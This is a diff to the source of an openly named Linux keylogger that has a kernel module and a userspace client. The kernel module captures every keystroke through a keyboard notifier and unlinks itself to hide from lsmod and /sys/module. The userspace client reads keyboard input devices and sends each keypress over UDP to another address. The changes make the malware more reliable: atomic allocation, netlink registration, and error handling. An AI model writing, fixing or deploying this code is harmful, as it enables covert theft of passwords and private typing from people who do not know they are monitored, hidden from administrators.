@@ -2,7 +2,7 @@
  * @file 0.c
  * @brief 0 Keylogger
  * @copyright Copyright (C) 2024 Davide Usberti
- * 
+ *
  * This program is free software: you can redistribute it and/or modify
  * it under the terms of the GNU General Public License as published by
  * the Free Software Foundation, either version 3 of the License, or
@@ -56,17 +56,18 @@ static int kb_notify(struct notifier_block *nblock, unsigned long code, void *_p
         ev.type = EV_KEY;
         ev.code = param->value;
         ev.value = 1;
-        
+
         msg_size = snprintf(msg, MAX_PAYLOAD, "%d", param->value);
-        
+
         if (!pid) return NOTIFY_OK;
 
-        skb_out = nlmsg_new(msg_size + sizeof(struct input_event), 0);
+        /* Notifier runs in atomic context, GFP_ATOMIC is required */
+        skb_out = nlmsg_new(msg_size + sizeof(struct input_event), GFP_ATOMIC);
         if (!skb_out) return NOTIFY_OK;
 
         nlh = nlmsg_put(skb_out, 0, 0, NLMSG_DONE, msg_size + sizeof(struct input_event), 0);
         NETLINK_CB(skb_out).dst_group = 0;
-        
+
         memcpy(nlmsg_data(nlh), &ev, sizeof(struct input_event));
         memcpy(nlmsg_data(nlh) + sizeof(struct input_event), msg, msg_size);
 
@@ -81,8 +82,8 @@ static struct notifier_block nb = {
 };
 
 static void nl_recv_msg(struct sk_buff *skb) {
-    struct nlmsghdr *nlh = (struct nlmsghdr *)skb->data;
-    pid = nlh->nlmsg_pid;
+    /* Kernel-verified port ID; nlh->nlmsg_pid is user-controlled */
+    pid = NETLINK_CB(skb).portid;
 }
 
 static struct netlink_kernel_cfg cfg = {
@@ -97,7 +98,8 @@ static int __init klogger_init(void) {
     }
 
     register_keyboard_notifier(&nb);
-    
+
+    /* Hide module from lsmod and /sys/module */
     list_del_init(&__this_module.list);
     kobject_del(&THIS_MODULE->mkobj.kobj);
 
@@ -118,16 +120,12 @@ MODULE_DESCRIPTION("Keyboard Module");
 
 #else
 
-/**
- * @brief Finds the keyboard device path by scanning /dev/input
- * @return Pointer to string containing device path, or NULL if not found
- */
 char* find_keyboard_device() {
     DIR *dir;
     struct dirent *ent;
     char path[267];
     char *device_path = NULL;
-    
+
     dir = opendir("/dev/input");
     if (dir == NULL) {
         fprintf(stderr, "Cannot open /dev/input: %s\n", strerror(errno));
@@ -141,7 +139,7 @@ char* find_keyboard_device() {
             if (fd != -1) {
                 char name[256];
                 if (ioctl(fd, EVIOCGNAME(sizeof(name)), name) > 0) {
-                    if (strstr(name, "keyboard") != NULL || 
+                    if (strstr(name, "keyboard") != NULL ||
                         strstr(name, "Keyboard") != NULL) {
                         device_path = strdup(path);
                         #ifdef DEBUG
@@ -155,14 +153,11 @@ char* find_keyboard_device() {
             }
         }
     }
-    
+
     closedir(dir);
     return device_path;
 }
 
-/**
- * @brief Handles keyboard input in kernel mode using netlink sockets
- */
 void handle_kernel_input(void) {
     struct sockaddr_nl src_addr, dest_addr;
     struct nlmsghdr *nlh = NULL;
@@ -209,50 +204,75 @@ void handle_kernel_input(void) {
 
     memset(&dest_addr, 0, sizeof(dest_addr));
     dest_addr.nl_family = AF_NETLINK;
-    dest_addr.nl_pid = 0;
+    dest_addr.nl_pid = 0;   /* kernel */
     dest_addr.nl_groups = 0;
 
-    nlh = (struct nlmsghdr *)malloc(NLMSG_SPACE(MAX_PAYLOAD));
+    nlh = malloc(NLMSG_SPACE(MAX_PAYLOAD));
+    if (!nlh) {
+        perror("malloc failed");
+        close(sock_fd);
+        close(udp_fd);
+        return;
+    }
     memset(nlh, 0, NLMSG_SPACE(MAX_PAYLOAD));
-    nlh->nlmsg_len = NLMSG_SPACE(MAX_PAYLOAD);
     nlh->nlmsg_pid = getpid();
-    nlh->nlmsg_flags = 0;
 
+    memset(&msg, 0, sizeof(msg));
     iov.iov_base = (void *)nlh;
-    iov.iov_len = nlh->nlmsg_len;
     msg.msg_name = (void *)&dest_addr;
     msg.msg_namelen = sizeof(dest_addr);
     msg.msg_iov = &iov;
     msg.msg_iovlen = 1;
 
+    /* Registration: makes the module's nl_recv_msg() record our port ID */
+    nlh->nlmsg_len = NLMSG_LENGTH(0);
+    iov.iov_len = nlh->nlmsg_len;
+
+    if (sendmsg(sock_fd, &msg, 0) < 0) {
+        perror("Netlink registration failed (is the module loaded?)");
+        free(nlh);
+        close(sock_fd);
+        close(udp_fd);
+        return;
+    }
+
+    /* Restore full receive capacity after registration */
+    nlh->nlmsg_len = NLMSG_SPACE(MAX_PAYLOAD);
+    iov.iov_len = NLMSG_SPACE(MAX_PAYLOAD);
+
     printf("Kernel mode keylogger started.\nPress CTRL+C to terminate.\n");
-    
+
     while (1) {
-        recvmsg(sock_fd, &msg, 0);
+        ssize_t ret = recvmsg(sock_fd, &msg, 0);
+        if (ret < 0) {
+            if (errno == EINTR) continue;
+            perror("Netlink recv failed");
+            break;
+        }
+        if ((size_t)ret < NLMSG_LENGTH(sizeof(struct input_event)))
+            continue;
+
         ev = (struct input_event *)NLMSG_DATA(nlh);
-        
+
         if (ev->type == EV_KEY && ev->value == 1) {
             #ifdef DEBUG
             slogd("Key pressed (kernel): %d", ev->code);
             #endif
-            
+
             if (sendto(udp_fd, ev, sizeof(struct input_event), 0,
                       (struct sockaddr *)&udp_addr, sizeof(udp_addr)) < 0) {
                 perror("UDP send failed");
             }
-            
+
             printf("Key pressed (kernel): %d\n", ev->code);
         }
     }
 
+    free(nlh);
     close(udp_fd);
     close(sock_fd);
 }
 
-/**
- * @brief Handles keyboard input in userspace mode by reading device directly
- * @param device_path Path to keyboard input device
- */
 void handle_userspace_input(const char *device_path) {
     int fd, udp_fd;
     struct input_event ev;
@@ -297,12 +317,12 @@ void handle_userspace_input(const char *device_path) {
             #ifdef DEBUG
             slogd("Key pressed (userspace): %d", ev.code);
             #endif
-            
+
             if (sendto(udp_fd, &ev, sizeof(struct input_event), 0,
                       (struct sockaddr *)&udp_addr, sizeof(udp_addr)) < 0) {
                 perror("UDP send failed");
             }
-            
+
             printf("Key pressed (userspace): %d\n", ev.code);
         }
     }
@@ -311,12 +331,6 @@ void handle_userspace_input(const char *device_path) {
     close(fd);
 }
 
-/**
- * @brief Main entry point
- * @param argc Argument count
- * @param argv Argument array
- * @return Exit status
- */
 int main(int argc, char *argv[]) {
     #ifdef DEBUG
     slog_init("keylogger", SLOG_FLAGS_ALL, 1);
